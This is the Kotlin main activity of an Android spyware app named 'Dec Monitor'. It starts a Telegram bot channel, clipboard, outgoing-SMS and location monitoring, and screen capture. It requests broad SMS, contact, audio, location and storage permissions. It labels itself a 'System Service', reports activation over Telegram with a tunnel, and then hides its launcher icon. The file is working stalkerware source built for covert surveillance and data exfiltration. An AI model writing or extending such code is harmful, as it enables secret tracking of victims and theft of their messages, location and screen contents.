package com.dec.monitor

import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.dec.monitor.input.ClipboardMonitor
import com.dec.monitor.location.LocationTracker
import com.dec.monitor.screen.ScreenshotService
import com.dec.monitor.server.PhoneServer
import com.dec.monitor.server.ServerService
import com.dec.monitor.sms.OutgoingSmsMonitor
import com.dec.monitor.stealth.StealthManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {

    private val PROJECTION_REQUEST = 1001
    private val PREFS_NAME = "dec_monitor_prefs"
    private val KEY_GRANTED = "projection_granted"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // start all services
        startForegroundService(Intent(this, PersistentService::class.java))
        startForegroundService(Intent(this, ServerService::class.java))

        TelegramBot.startPolling(applicationContext)
        ClipboardMonitor.start(applicationContext)
        OutgoingSmsMonitor.start(applicationContext)
        LocationTracker.startTracking(applicationContext)
        TelegramBot.appContext = applicationContext

        requestPermissions(arrayOf(
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.READ_MEDIA_IMAGES,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.MODIFY_AUDIO_SETTINGS,
        ), 100)

        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val alreadyGranted = prefs.getBoolean(KEY_GRANTED, false)
        val tvStatus = findViewById<TextView>(R.id.tvStatus)

        if (alreadyGranted) {
            tvStatus.text = "Initializing..."
            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            startActivityForResult(projectionManager.createScreenCaptureIntent(), PROJECTION_REQUEST)
        } else {
            tvStatus.text = "System Service\nTap Start to initialize."
            findViewById<Button>(R.id.btnStart).setOnClickListener {
                val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                startActivityForResult(projectionManager.createScreenCaptureIntent(), PROJECTION_REQUEST)
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == PROJECTION_REQUEST && resultCode == Activity.RESULT_OK && data != null) {

            getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                .edit().putBoolean(KEY_GRANTED, true).apply()

            // start screenshot service
            startForegroundService(Intent(this, ScreenshotService::class.java).apply {
                putExtra(ScreenshotService.EXTRA_RESULT_CODE, resultCode)
                putExtra(ScreenshotService.EXTRA_RESULT_DATA, data)
            })

            // give PhoneServer the projection too
            val metrics = resources.displayMetrics
            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val projection = projectionManager.getMediaProjection(resultCode, data)
            PhoneServer.setupProjection(projection, metrics.widthPixels, metrics.heightPixels, metrics.densityDpi)

            findViewById<TextView>(R.id.tvStatus).text = "✅ Active."

            CoroutineScope(Dispatchers.IO).launch {
                TelegramBot.sendMessage("✅ <b>Dec Monitor active.</b>\n/help for commands.\n🔗 Tunnel starting...")
            }

            Handler(Looper.getMainLooper()).postDelayed({
                StealthManager.hideIcon(applicationContext)
                finish()
            }, 3000)
        }
    }
}
